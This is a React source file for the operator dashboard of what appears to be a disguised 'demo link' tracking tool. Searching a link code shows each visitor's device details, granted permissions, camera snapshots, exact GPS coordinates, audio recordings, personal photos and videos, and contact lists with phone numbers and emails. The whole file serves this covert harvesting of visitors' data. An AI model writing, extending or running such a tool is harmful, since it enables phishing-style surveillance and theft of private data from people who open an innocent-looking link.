import React, { useState, useEffect } from "react";
import axios from "axios";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
import { ArrowLeft, Search, Camera, MapPin, Mic, CheckCircle, XCircle, ChevronDown, Folder, Image as ImageIcon, Video, Users, Smartphone, Monitor } from "lucide-react";
import { toast } from "sonner";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const DetailsView = ({ onBack, initialCode }) => {
  const [demoCode, setDemoCode] = useState(initialCode || "");
  const [loading, setLoading] = useState(false);
  const [details, setDetails] = useState(null);

  useEffect(() => {
    if (initialCode) {
      handleSearch(initialCode);
    }
  }, [initialCode]);

  const extractCodeFromUrl = (input) => {
    const match = input.match(/\/l\/([^\/]+)/);
    if (match) {
      return match[1];
    }
    return input.trim();
  };

  const handleSearch = async (code = null) => {
    const searchCode = code || extractCodeFromUrl(demoCode);
    
    if (!searchCode) {
      toast.error("Please enter a demo link or code");
      return;
    }

    setLoading(true);
    try {
      const linkResponse = await axios.get(`${API}/demo-links/${searchCode}`);
      const logsResponse = await axios.get(`${API}/visit-logs/${searchCode}`);
      
      setDetails({
        link: linkResponse.data,
        visits: logsResponse.data,
      });
    } catch (error) {
      console.error("Error fetching details:", error);
      toast.error("Demo link not found");
      setDetails(null);
    } finally {
      setLoading(false);
    }
  };

  const permissionIcons = {
    camera: Camera,
    location: MapPin,
    microphone: Mic,
    photos: ImageIcon,
    contacts: Users,
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-50">
      <header className="border-b border-gray-200 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center gap-4">
          <Button
            variant="ghost"
            onClick={onBack}
            data-testid="back-btn"
            size="icon"
          >
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <h1 className="text-2xl font-bold text-gray-900">View Details</h1>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12">
        <div className="max-w-4xl mx-auto space-y-6">
          <Card className="shadow-lg">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Search className="h-5 w-5" />
                Search Demo Link Details
              </CardTitle>
              <CardDescription>
                Enter the demo link or code to view captured details
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex gap-2">
                <Input
                  type="text"
                  placeholder="Enter demo link or code"
                  value={demoCode}
                  onChange={(e) => setDemoCode(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleSearch()}
                  className="h-12"
                  data-testid="demo-code-input"
                />
                <Button
                  onClick={() => handleSearch()}
                  disabled={loading}
                  className="h-12 bg-indigo-600 hover:bg-indigo-700"
                  data-testid="search-btn"
                >
                  {loading ? "Searching..." : "Search"}
                </Button>
              </div>
            </CardContent>
          </Card>

          {details && (
            <>
              <Card className="shadow-lg">
                <CardHeader>
                  <CardTitle>Link Information</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="text-sm font-medium text-gray-700">Original URL</label>
                    <p className="text-sm text-gray-600 break-all mt-1">{details.link.original_url}</p>
                  </div>
                  <div>
                    <label className="text-sm font-medium text-gray-700">Permissions Requested</label>
                    <div className="flex flex-wrap gap-2 mt-1">
                      {details.link.permissions.map((perm) => {
                        const Icon = permissionIcons[perm];
                        return (
                          <div key={perm} className="flex items-center gap-1 px-3 py-1 bg-indigo-100 text-indigo-700 rounded-full text-sm">
                            {Icon && <Icon className="h-3 w-3" />}
                            <span className="capitalize">{perm}</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                  <div>
                    <label className="text-sm font-medium text-gray-700">Total Visits</label>
                    <p className="text-sm text-gray-600 mt-1">{details.link.visits}</p>
                  </div>
                  <div>
                    <label className="text-sm font-medium text-gray-700">Created At</label>
                    <p className="text-sm text-gray-600 mt-1">{new Date(details.link.created_at).toLocaleString()}</p>
                  </div>
                </CardContent>
              </Card>

              {details.visits.length > 0 ? (
                <div className="space-y-4">
                  <h3 className="text-xl font-bold text-gray-900">Visit History ({details.visits.length})</h3>
                  {details.visits.map((visit, index) => (
                    <Card key={visit.id || index} className="shadow-lg" data-testid={`visit-${index}`}>
                      <CardHeader>
                        <div className="flex items-center justify-between">
                          <div>
                            <CardTitle className="text-lg">Visit #{details.visits.length - index}</CardTitle>
                            <CardDescription>{new Date(visit.timestamp).toLocaleString()}</CardDescription>
                          </div>
                          {visit.device_info && (
                            <div className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-full">
                              {visit.device_info.deviceType === 'Desktop' ? (
                                <Monitor className="h-4 w-4 text-gray-600" />
                              ) : (
                                <Smartphone className="h-4 w-4 text-gray-600" />
                              )}
                              <span className="text-sm text-gray-700">
                                {visit.device_info.deviceType} • {visit.device_info.browser} • {visit.device_info.os}
                              </span>
                            </div>
                          )}
                        </div>
                      </CardHeader>
                      <CardContent className="space-y-4">
                        <div className="space-y-2">
                          <label className="text-sm font-medium text-gray-700">Permissions Status</label>
                          <div className="grid gap-2">
                            {visit.permissions_granted.map((perm) => (
                              <div key={perm} className="flex items-center gap-2 text-sm">
                                <CheckCircle className="h-4 w-4 text-green-600" />
                                <span className="capitalize">{perm}</span>
                                <span className="text-green-600 font-medium">Granted</span>
                              </div>
                            ))}
                            {visit.permissions_denied.map((perm) => (
                              <div key={perm} className="flex items-center gap-2 text-sm">
                                <XCircle className="h-4 w-4 text-red-600" />
                                <span className="capitalize">{perm}</span>
                                <span className="text-red-600 font-medium">Denied</span>
                              </div>
                            ))}
                          </div>
                        </div>

                        {visit.camera_images && visit.camera_images.length > 0 && (
                          <div className="space-y-2">
                            <label className="text-sm font-medium text-gray-700">Camera Photos ({visit.camera_images.length})</label>
                            <div className="grid grid-cols-3 gap-4">
                              {visit.camera_images.map((img, imgIndex) => (
                                <img
                                  key={imgIndex}
                                  src={img}
                                  alt={`Camera capture ${imgIndex + 1}`}
                                  className="rounded-lg border w-full aspect-square object-cover"
                                  data-testid={`camera-image-${imgIndex}`}
                                />
                              ))}
                            </div>
                          </div>
                        )}

                        {visit.location_data && (
                          <div className="space-y-2">
                            <label className="text-sm font-medium text-gray-700">Location Data</label>
                            <div className="bg-gray-50 p-4 rounded-lg border text-sm space-y-1">
                              <p><strong>Latitude:</strong> {visit.location_data.latitude.toFixed(6)}</p>
                              <p><strong>Longitude:</strong> {visit.location_data.longitude.toFixed(6)}</p>
                              <p><strong>Accuracy:</strong> {visit.location_data.accuracy.toFixed(0)} meters</p>
                              {visit.location_data.timestamp && (
                                <p><strong>Captured:</strong> {new Date(visit.location_data.timestamp).toLocaleString()}</p>
                              )}
                            </div>
                          </div>
                        )}

                        {visit.audio_data && (
                          <div className="space-y-2">
                            <label className="text-sm font-medium text-gray-700">Audio Recording</label>
                            <audio controls src={visit.audio_data} className="w-full" />
                          </div>
                        )}

                        {visit.media_files && visit.media_files.length > 0 && (
                          <Collapsible className="space-y-2">
                            <CollapsibleTrigger className="flex items-center justify-between w-full p-3 bg-gray-50 rounded-lg border hover:bg-gray-100 transition-colors">
                              <div className="flex items-center gap-2">
                                <Folder className="h-5 w-5 text-yellow-600" />
                                <span className="text-sm font-medium">Photos & Videos ({visit.media_files.length})</span>
                              </div>
                              <ChevronDown className="h-4 w-4 text-gray-500" />
                            </CollapsibleTrigger>
                            <CollapsibleContent className="space-y-2 pt-2">
                              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                                {visit.media_files.map((media, mediaIndex) => (
                                  <div key={mediaIndex} className="relative group">
                                    {media.type === 'image' ? (
                                      <div className="relative">
                                        <ImageIcon className="absolute top-2 left-2 h-4 w-4 text-white bg-black/50 rounded p-0.5" />
                                        <img
                                          src={media.data}
                                          alt={`Media ${mediaIndex + 1}`}
                                          className="rounded-lg border w-full aspect-square object-cover"
                                        />
                                      </div>
                                    ) : (
                                      <div className="relative">
                                        <Video className="absolute top-2 left-2 h-4 w-4 text-white bg-black/50 rounded p-0.5" />
                                        <video
                                          src={media.data}
                                          controls
                                          className="rounded-lg border w-full aspect-square object-cover"
                                        />
                                      </div>
                                    )}
                                  </div>
                                ))}
                              </div>
                            </CollapsibleContent>
                          </Collapsible>
                        )}

                        {visit.contacts && visit.contacts.length > 0 && (
                          <Collapsible className="space-y-2">
                            <CollapsibleTrigger className="flex items-center justify-between w-full p-3 bg-gray-50 rounded-lg border hover:bg-gray-100 transition-colors">
                              <div className="flex items-center gap-2">
                                <Folder className="h-5 w-5 text-blue-600" />
                                <span className="text-sm font-medium">Contacts ({visit.contacts.length})</span>
                              </div>
                              <ChevronDown className="h-4 w-4 text-gray-500" />
                            </CollapsibleTrigger>
                            <CollapsibleContent className="space-y-2 pt-2">
                              <div className="space-y-2">
                                {visit.contacts.map((contact, contactIndex) => (
                                  <div key={contactIndex} className="p-3 bg-gray-50 rounded-lg border">
                                    <p className="text-sm font-medium">{contact.name}</p>
                                    {contact.phone && <p className="text-xs text-gray-600 mt-1">Phone: {contact.phone}</p>}
                                    {contact.email && <p className="text-xs text-gray-600">Email: {contact.email}</p>}
                                  </div>
                                ))}
                              </div>
                            </CollapsibleContent>
                          </Collapsible>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                </div>
              ) : (
                <Card className="text-center py-12">
                  <CardContent>
                    <p className="text-gray-500">No visits recorded yet</p>
                  </CardContent>
                </Card>
              )}
            </>
          )}
        </div>
      </main>
    </div>
  );
};

export default DetailsView;